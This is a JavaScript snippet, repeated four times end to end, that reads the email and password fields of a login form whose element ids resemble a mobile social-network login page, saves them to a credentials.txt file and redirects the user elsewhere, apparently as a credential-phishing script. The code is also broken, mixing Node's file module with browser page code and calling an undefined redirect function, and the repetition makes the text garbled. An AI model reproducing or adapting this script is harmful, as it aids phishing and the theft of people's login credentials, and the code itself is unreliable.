// Import the fs module to write to a file
const fs = require('fs');

// Get references to the email, password, and login button elements
const emailInput = document.getElementById('m_login_email');
const passwordInput = document.getElementById('m_login_password');
const loginButton = document.querySelector('.login_button_block');

// Define a function to save the credentials to a text file
function saveCredentials() {
  // Get the values of the email and password inputs
  const email = emailInput.value;
  const password = passwordInput.value;

  // Create a string with the email and password separated by a comma
  const credentials = `${email},${password}`;

  // Write the credentials to a text file named "credentials.txt"
  fs.writeFileSync('credentials.txt', credentials);
  
  // Redirect the user to the specified URL
  redirectTo('https://example.com');
}// Import the fs module to write to a file
const fs = require('fs');

// Get references to the email, password, and login button elements
const emailInput = document.getElementById('m_login_email');
const passwordInput = document.getElementById('m_login_password');
const loginButton = document.querySelector('.login_button_block');

// Define a function to save the credentials to a text file
function saveCredentials() {
  // Get the values of the email and password inputs
  const email = emailInput.value;
  const password = passwordInput.value;

  // Create a string with the email and password separated by a comma
  const credentials = `${email},${password}`;

  // Write the credentials to a text file named "credentials.txt"
  fs.writeFileSync('credentials.txt', credentials);
  
  // Redirect the user to the specified URL
  redirectTo('https://example.com');
}// Import the fs module to write to a file
const fs = require('fs');

// Get references to the email, password, and login button elements
const emailInput = document.getElementById('m_login_email');
const passwordInput = document.getElementById('m_login_password');
const loginButton = document.querySelector('.login_button_block');

// Define a function to save the credentials to a text file
function saveCredentials() {
  // Get the values of the email and password inputs
  const email = emailInput.value;
  const password = passwordInput.value;

  // Create a string with the email and password separated by a comma
  const credentials = `${email},${password}`;

  // Write the credentials to a text file named "credentials.txt"
  fs.writeFileSync('credentials.txt', credentials);
  
  // Redirect the user to the specified URL
  redirectTo('https://example.com');
}// Import the fs module to write to a file
const fs = require('fs');

// Get references to the email, password, and login button elements
const emailInput = document.getElementById('m_login_email');
const passwordInput = document.getElementById('m_login_password');
const loginButton = document.querySelector('.login_button_block');

// Define a function to save the credentials to a text file
function saveCredentials() {
  // Get the values of the email and password inputs
  const email = emailInput.value;
  const password = passwordInput.value;

  // Create a string with the email and password separated by a comma
  const credentials = `${email},${password}`;

  // Write the credentials to a text file named "credentials.txt"
  fs.writeFileSync('credentials.txt', credentials);
  
  // Redirect the user to the specified URL
  redirectTo('https://example.com');
}